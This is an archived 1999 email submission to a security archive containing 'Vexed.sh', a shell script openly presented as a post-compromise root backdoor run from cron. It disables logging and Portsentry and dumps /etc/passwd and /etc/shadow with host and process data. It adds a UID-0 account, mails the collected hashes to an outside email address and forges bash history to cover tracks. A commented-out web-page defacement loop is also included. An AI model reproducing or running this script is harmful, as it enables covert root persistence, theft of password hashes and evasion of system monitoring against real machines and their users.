From root@register.com Tue Oct 19 04:10:07 1999
Return-Path: <root@register.com>
Received: from register.com(ip8.an11-new-york4.ny.pub-ip.psi.net[38.26.22.8]) (3596 bytes) by packetstorm.securify.com
	via sendmail with P:esmtp/D:user/T:local
	(sender: <root@register.com>) 
	id <m11dX9Z-0006CIC@packetstorm.securify.com>
	for <submissions@packetstorm.securify.com>; Tue, 19 Oct 1999 04:10:05 -0700 (PDT)
	(Smail-3.2.0.106 1999-Mar-31 #1 built 1999-Sep-18)
Received: (from root@localhost)
	by register.com (8.9.3/8.9.3) id HAA00892
	for submissions@packetstorm.securify.com; Tue, 19 Oct 1999 07:07:32 -0400
Date: Tue, 19 Oct 1999 07:07:32 -0400
From: root <root@register.com>
Message-Id: <199910191107.HAA00892@register.com>
To: submissions@packetstorm.securify.com
Subject: Vexed.sh
Status: RO

#######################
# !/bin/sh
# vexed
# sil@antioffline.com
# Ultimate Backdoor
# Keeper set to run
# in cron.monthly
# Dumb script, but
# served its purpose
# for me.
#######################

PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

# Lets stop logging commands for a bit
# remember this is after you have root.

chmod 0 /root/.bash_history

# stop log files in case of Portsentry
# Logcheck, NFR, etc

chmod 0 /var/log/*

# Of course they'll be set shit back to
# normal after this script runs itself.

# Lets stop portsentry from adding our
# asses to the deny file

chmod 0 /usr/local/psionic/portsentry/*

# ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
# Default path for portsentry

# Create our file for future root reference
# set it so no one else can touch it while
# it runs... Of course root can though...

touch /tmp/vexed
chmod 0 /tmp/vexed

# Get a hosts info for reference

ifconfig -a >> /tmp/vexed

# Paranoia! Lets see what was running to get
# a hint of anything we'd have to kill in an
# emergency.

ps aux >> /tmp/vexed

# Wanna waste time cracking a password
# file ... whatever floats your boat.
# I just cat a user into the shadow
# file. Remember to tweak this if there's
# no shadow file. # out shadow and enter
# the password into the >> passwd file

# Easy way to determine the correct setting
# would be to adduser in your OS and copy it
# then echo it to the correct destination.
# EG: /etc/master.passwd for BSD's
# I set this UID=0 since there are over 1000
# users on this specific server and I know
# the admin doesn't monitor the box
# you should change this to 500 most likely.

cat /etc/passwd >> /tmp/vexed
cat /etc/shadow >> /tmp/vexed

# BSD users 
# cat /etc/master.passwd >> /tmp/vexed

echo alterb0y:shWm5UR68F3Us:0:0::/:/bin/bash >> /etc/shadow
echo alterb0y:x:0:0::/:/bin/bash >> /etc/shadow

# Next bunch of crap is basically bullshit
# but some kiddies might find it useful.
# It's commented out since I have no use
# for it whatsoever.
# For milw0rm type page hax0rers
# easiest way to do it would be
# to get a userlist and uncomment
# this junk to change their webpages.
# greets to xinu for the switch ;)
#
# find / -name index* >> /tmp/vexed
# 
# for user in `cat userlist`
#
#	 do
#
# 	 mv $user/index.html $user/orig.index.html
#
# 	 cp /your/leet0/html/pages/path $user/index.html
#
# done

# Obviously an email foreign to anyone. I set this
# account up purposely for dumb shit.

mail -s ro0ted realitykillz@hotmail.com < /tmp/vexed
rm -f /tmp/vexed
chmod 744 /var/log/*
chmod 744 /usr/local/psionic/portsentry/*

# Throw in a bunch of crap to fill _bash_history ;)

echo ls -a >> ~/.bash_history
echo uptime >> ~/.bash_history
echo du . -m >> ~/.bash_history
echo w >> ~/.bash_history
echo dig someshit.org >> ~/.bash_history
echo man time >> ~/.bash_history
echo man hostname >> ~/.bash_history
echo ls -a >> ~/.bash_history
repeat 10 echo ls -a >> ~/.bash_history

#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#
# Served its purpose for me at least
# #bofh #syndrome #unixgods on the efnet
#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#

